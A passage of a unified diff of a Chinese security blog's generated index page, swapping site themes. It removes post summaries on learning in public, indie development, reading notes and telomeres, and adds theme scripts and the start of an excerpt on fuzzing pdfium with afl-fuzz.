@@ -1,1336 +1,290 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha256-CTSx/A06dm1B063156EVh15m6Y67pAjZZaQc89LLSrU=" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
-
-<script class="next-config" data-name="main" type="application/json">{"hostname":"usmacd.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.18.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
-
-    <meta property="og:type" content="website">
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>安全代码</title><meta name="author" content="henices"><meta name="copyright" content="henices"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta property="og:type" content="website">
 <meta property="og:title" content="安全代码">
 <meta property="og:url" content="http://usmacd.com/index.html">
 <meta property="og:site_name" content="安全代码">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://usmacd.com/img/avatar.png">
 <meta property="article:author" content="henices">
 <meta name="twitter:card" content="summary">
-
-
-<link rel="canonical" href="http://usmacd.com/">
-
-
-
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"index.html","title":""}</script>
-
-<script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>安全代码</title>
-  
-
-
-
-
-
-
-
-
-  <noscript>
-    <link rel="stylesheet" href="/css/noscript.css">
-  </noscript>
-<link rel="alternate" href="/atom.xml" title="安全代码" type="application/atom+xml">
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
-  <div class="headband"></div>
-
-  <main class="main">
-    <div class="column">
-      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar" role="button">
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <i class="logo-line"></i>
-      <h1 class="site-title">安全代码</h1>
-      <i class="logo-line"></i>
-    </a>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger" aria-label="Search" role="button">
-    </div>
-  </div>
-</div>
-
-
-
-<nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li>
-  </ul>
-</nav>
-
-
-
-
-</header>
-        
-  
-  <aside class="sidebar">
-
-    <div class="sidebar-inner sidebar-overview-active">
-      <ul class="sidebar-nav">
-        <li class="sidebar-nav-toc">
-          Table of Contents
-        </li>
-        <li class="sidebar-nav-overview">
-          Overview
-        </li>
-      </ul>
-
-      <div class="sidebar-panel-container">
-        <!--noindex-->
-        <div class="post-toc-wrap sidebar-panel">
-        </div>
-        <!--/noindex-->
-
-        <div class="site-overview-wrap sidebar-panel">
-          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="henices"
-      src="/images/avatar.jpg">
-  <p class="site-author-name" itemprop="name">henices</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap animated">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-        <a href="/archives/">
-          <span class="site-state-item-count">102</span>
-          <span class="site-state-item-name">posts</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-tags">
-          <a href="/tags/">
-        <span class="site-state-item-count">15</span>
-        <span class="site-state-item-name">tags</span></a>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author animated">
-      <span class="links-of-author-item">
-        <a href="https://twitter.com/henices" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;henices" rel="noopener me" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="/atom.xml" title="RSS → &#x2F;atom.xml" rel="noopener me"><i class="rss fa-fw"></i>RSS</a>
-      </span>
-  </div>
-
-        </div>
-      </div>
-    </div>
-
-    
-    <div class="sidebar-inner sidebar-blogroll">
-      <div class="links-of-blogroll animated">
-        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
-          Links
-        </div>
-        <ul class="links-of-blogroll-list">
-            <li class="links-of-blogroll-item">
-              <a href="http://scz.617.cn:8/" title="http:&#x2F;&#x2F;scz.617.cn:8&#x2F;" rel="noopener" target="_blank">飞花堂</a>
-            </li>
-            <li class="links-of-blogroll-item">
-              <a href="https://www.v2ex.com/" title="https:&#x2F;&#x2F;www.v2ex.com&#x2F;" rel="noopener" target="_blank">V2EX</a>
-            </li>
-            <li class="links-of-blogroll-item">
-              <a href="https://blog.forecho.com/" title="https:&#x2F;&#x2F;blog.forecho.com&#x2F;" rel="noopener" target="_blank">forecho</a>
-            </li>
-            <li class="links-of-blogroll-item">
-              <a href="https://www.mrhuangtalk.com/" title="https:&#x2F;&#x2F;www.mrhuangtalk.com&#x2F;" rel="noopener" target="_blank">Mr.Huang talk</a>
-            </li>
-            <li class="links-of-blogroll-item">
-              <a href="https://demochen.com/" title="https:&#x2F;&#x2F;demochen.com&#x2F;" rel="noopener" target="_blank">DemoChen</a>
-            </li>
-        </ul>
-      </div>
-    </div>
-  </aside>
-
-
-    </div>
-
-    <div class="main-inner index posts-expand">
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/en/learn_in_public/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/en/learn_in_public/" class="post-title-link" itemprop="url">Learn In Public 摘要</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-11-01 23:05:19" itemprop="dateCreated datePublished" datetime="2023-11-01T23:05:19+08:00">2023-11-01</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>a habit of creating <strong>learning exhaust</strong>  </p>
-<ul>
-<li>Write blogs and tutorials and cheatsheets.  </li>
-<li>Speak at meetups and conferences.  </li>
-<li>Ask and answer things on Stackoverflow or Reddit.  <ul>
-<li>Avoid the walled gardens like Slack and Discord, they’re not public.</li>
-</ul>
-</li>
-<li>Make Youtube videos or Twitch streams.  </li>
-<li>Start a newsletter.  </li>
-<li>Draw cartoons (people loooove cartoons!)</li>
-</ul>
-<p>Whatever your thing is, make the thing you wish you had found when you were learning.  </p>
-<ul>
-<li><strong>Don’t judge your results by “claps” or retweets or stars or upvotes</strong></li>
-</ul>
-<p>Oh you think you’re done? Don’t stop there:  </p>
-<ul>
-<li>Enjoyed a coding video? Reach out to the speaker&#x2F;instructor and thank them, and ask questions.  </li>
-<li>Make PR’s to libraries you use.  </li>
-<li>Make your own libraries no one will ever use.  </li>
-<li>Clone stuff you like, from scratch, to see how they work.  </li>
-<li>Teach workshops.  </li>
-<li>Go to conferences and summarize what you learned.</li>
-</ul>
-<p>The subheading under this rule would be: <strong>Try your best to be right, but don’t worry when you’re wrong.</strong>  </p>
-<ul>
-<li>People think you suck? Good. You agree. Ask them to explain, in detail, why you suck  </li>
-<li>You want to just feel good or you want to <strong>be</strong> good?  <ul>
-<li>Then go away and prove them wrong. Of course, if they get abusive block them.</li>
-</ul>
-</li>
-</ul>
-<p>At some point you’ll get some support behind you. People notice genuine learners. They’ll want to help you.  </p>
-<ul>
-<li>Don’t tell them, but they just became your mentors.  </li>
-<li>This is very important: Pick up what they put down  </li>
-<li>Because you learn in public. By teaching you, they teach many.</li>
-</ul>
-<p>source: <a target="_blank" rel="noopener" href="https://www.swyx.io/learn-in-public/">https://www.swyx.io/learn-in-public/</a></p>
-
+<meta name="twitter:image" content="http://usmacd.com/img/avatar.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://usmacd.com/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '安全代码',
+  isPost: false,
+  isHome: true,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-11-06 14:11:14'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
       
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
+        get: key => {
+          const itemStr = localStorage.getItem(key)
       
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/tulading/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/tulading/" class="post-title-link" itemprop="url">图拉鼎谈独立开发</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-11-01 00:00:00" itemprop="dateCreated datePublished" datetime="2023-11-01T00:00:00+08:00">2023-11-01</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>独立开发</p>
-<ul>
-<li>长期维护产品：消费者愿意为长期维护的产品买单，旧产品没有添加新功能也用新工具链重新编译一次</li>
-<li>只开发自己使用的产品：评估未来几年自己是否使用产品，作为是否启动产品开发的重要因素</li>
-<li>外包 + 独立开发 双驱动<ul>
-<li>用外包的收入平滑独立开发的收入波动</li>
-<li>在产品开发瓶颈期，利用外包刺激，打开思路</li>
-</ul>
-</li>
-</ul>
-<p>项目管理</p>
-<ul>
-<li>立项流程: 先记下 idea，冷却一段时间后如果有思路就继续完善一下 idea，直到某天还是想做，接着就开始动手</li>
-<li>没有市场分析，没有用户分析，只有分阶段完成的 1.0、2.0 … 版本</li>
-<li>1.0 版本为自己开发，只开发最核心的功能，2-n 通过用户的反馈完善产品</li>
-</ul>
-<p>工作模式</p>
-<ul>
-<li>充分利用灵活性，在家和在外工作的时间大致是 2:1</li>
-<li>定期与设计师碰头，每周2-3 次</li>
-</ul>
-<p>状态管理</p>
-<ul>
-<li>有多少状态做多少事，即使状态不太好，也需要做事。</li>
-<li>外部环境对状态有影响，可以利用图书馆等场所，将自己带入状态。</li>
-</ul>
-<p>时间管理（自律）</p>
-<ul>
-<li>曾经经历工作混乱的时期，现在严格工作时间登记，自己开发系统完成工作时间登记。</li>
-<li>自律还包括定期 Review (日报、周报)，计划管理，保持自己的开发节奏。</li>
-<li>工作日基本都工作和上班无差异，除非遇上紧急的事。</li>
-</ul>
-<p>好奇心</p>
-<ul>
-<li>喜欢新技术，喜欢新产品，喜欢折腾 (ubuntu Tweak)</li>
-</ul>
-<p>敏感度</p>
-<ul>
-<li>独立开发者，需要通过社交媒体、邮件列表、newsletter 连接外部世界，保持对新事物的敏感度</li>
-</ul>
-<p>听完 podcast，我发现图拉鼎非常强调工作和兴趣的匹配度，这可能就是他能长期维护产品的一个重要原因。</p>
-<p>reference: <a target="_blank" rel="noopener" href="https://pca.st/5v33uy2z">https://pca.st/5v33uy2z</a></p>
-
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
       
-    </div>
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
 
-    
-    
-    
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
 
-    <footer class="post-footer">
-        <div class="post-eof"></div>
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
       
-    </footer>
-  </article>
-</div>
-
-
-
-
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
     
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="安全代码" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">102</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/atom.xml"><span> RSS</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('https://wallpaperaccess.com/full/1146672.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="安全代码"><span class="site-name">安全代码</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/atom.xml"><span> RSS</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">安全代码</h1><div id="site_social_icons"><a class="social-icon" href="https://twitter.com/henices" target="_blank" title="Twitter"><i class="fab fa-twitter" style="color: #4a7dbe;"></i></a><a class="social-icon" href="mailto:henices@163.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #24292e;"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/pdfium-fuzz.public/" title="使用 afl-fuzz fuzz pdfium">使用 afl-fuzz fuzz pdfium</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-11-06T05:52:04.969Z" title="Created 2023-11-06 13:52:04">2023-11-06</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Security/">Security</a></span></div><div class="content">下载源码先在 https://pdfium.googlesource.com/pdfium/ 下载源码.
+12345mkdir repocd repogclient config --unmanaged https://pdfium.googlesource.com/pdfium.gitgclient synccd pdfium
 
+gclient 命令在 depot_tools 中, 需要安装 参考下面的文章
+http://www.chromium.org/developers/how-tos/install-depot-tools
+12git clone https://chromium.googlesource.com/chromium/tools/depot_tools.gitexport PATH=`pwd`/depot_tools:&quot;$PATH&quot;
 
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/youyuxi/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/youyuxi/" class="post-title-link" itemprop="url">尤雨溪谈成功和运气</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-11-01 00:00:00" itemprop="dateCreated datePublished" datetime="2023-11-01T00:00:00+08:00">2023-11-01</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>1）运气很重要，时势造英雄<br>在适当的时间节点上推出合适的产品能大幅提高成功的概率<br>2）真正的关键点，不在写程序上<br>重要的是判断需求，制定合适的技术方案去满足客户的需求<br>3）成功需要市场直觉和产品上的判断力<br>4）光有能力或者光有运气都很难成功<br>运气是客观存在的，But there’s nothing we can do about it.<br>5）我们只能提高自己能力，多尝试，每次尝试运气都不一样<br>6）独立开发重要的不是技术的优劣，而是如何开发一个产品的问题</p>
-<ul>
-<li>如何快速匹配市场需求</li>
-<li>如何识别目标客户</li>
-<li>如何快速验证商业模式</li>
-<li>如何快速推向市场。</li>
-<li>考验的是运营能力、合理分配资源的能力，简化创业流程的能力</li>
-</ul>
-<p>reference: <a target="_blank" rel="noopener" href="https://pca.st/yjf05b7i">https://pca.st/yjf05b7i</a></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/qiangliyandu/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/qiangliyandu/" class="post-title-link" itemprop="url">万维钢的强力研读笔记法</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-09-25 00:00:00" itemprop="dateCreated datePublished" datetime="2023-09-25T00:00:00+08:00">2023-09-25</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>清晰表达每一章的逻辑脉络</p>
-<ul>
-<li>按照书籍的章节给笔记划分章节，用自己的话写出每一个章节的内容，各章内容串联起来就成了整本书的内容提要</li>
-<li>最重要的是理清作者的逻辑脉络，每一章的逻辑结构可能就几句话，却可能分散在大几十页的内容中</li>
-</ul>
-<p>带走书中的所有亮点</p>
-<ul>
-<li>读书不是划线式的重点内容总结，而应该注意让你拍案叫绝，点醒梦中人，这些可以刺激改变你的思维的内容</li>
-</ul>
-<p>大量自己的看法和心得</p>
-<ul>
-<li>强力研读是主动式的读书，你需要写下自己对一段内容或一句话的理解</li>
-<li>你可以质疑或者肯定作者的看法，也可以写下自己阅读时的灵感</li>
-<li>在写读书笔记的过程中，你可能突然解决了一个你以前关注的问题，也可能想到了书中思想一个应用场景</li>
-<li>这些灵感都相当宝贵，转瞬即逝，一定要将把他们记录下来</li>
-</ul>
-<p>发现本书和其他书籍文章的联系</p>
-<ul>
-<li>极少书的思想是独立与世界的，大多新知识都是建立在旧知识的基础上的</li>
-<li>同一问题，不同书籍的作者的看法有什么不同之处，有没有新的论据支持或者反对他们的看法</li>
-</ul>
-<p>好书需要至少阅读两遍</p>
-<ul>
-<li>第一遍是为了陷进去，第二遍是为了跳出来</li>
-<li>第一遍阅读可能对领域内容不太熟悉，全部带宽都要用于理解作者的思想。</li>
-<li>想法只有在带宽剩余时，才可能冒出来。为了最有价值的心得、灵感和联系，对好书我们至少阅读两遍</li>
-<li>笔记是对好书最好的敬意，笔记不是书评，它是个人知识的延伸</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/living_younger_healthier_logger/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/living_younger_healthier_logger/" class="post-title-link" itemprop="url">端粒效应</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-09-13 00:00:00" itemprop="dateCreated datePublished" datetime="2023-09-13T00:00:00+08:00">2023-09-13</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>获得 2009 年诺贝尔生理或医学奖的 伊丽莎白·布莱克本在 《端粒效应》一书中说明：人只所以变老，是由于某些细胞不再更新了，而细胞分裂更新的限制在于 “端粒”。</p>
-<p>端粒是染色体末端的 DNA 序列，在细胞分裂过程中，端粒起到保护 DNA 序列的作用。所以，人之所变老的本质原因是 「端粒变短」。</p>
-<p>影响端粒变短的因素</p>
-<ul>
-<li>思想压力：研究表明长期照顾患病小孩的母亲，端粒长度较正常人变短</li>
-<li>敌意：看哪儿都不对，和周围的人关系极差</li>
-<li>悲观：对事情总有一个负面的预期</li>
-<li>胡思乱想：抑郁，都是乱想负面的东西，觉得不公平对待</li>
-</ul>
-<p>缓解负面情绪的方法</p>
-<ul>
-<li>把压力视为挑战：对压力的反应是威胁还是挑战，决定压力的性质</li>
-<li>专注力训练：冥想</li>
-<li>找到人生的目标：find something bigger than yourself</li>
-</ul>
-<p>锻炼对端粒的好处</p>
-<ul>
-<li>人体是反脆弱系统：锻炼的本质是对身体的适度打击</li>
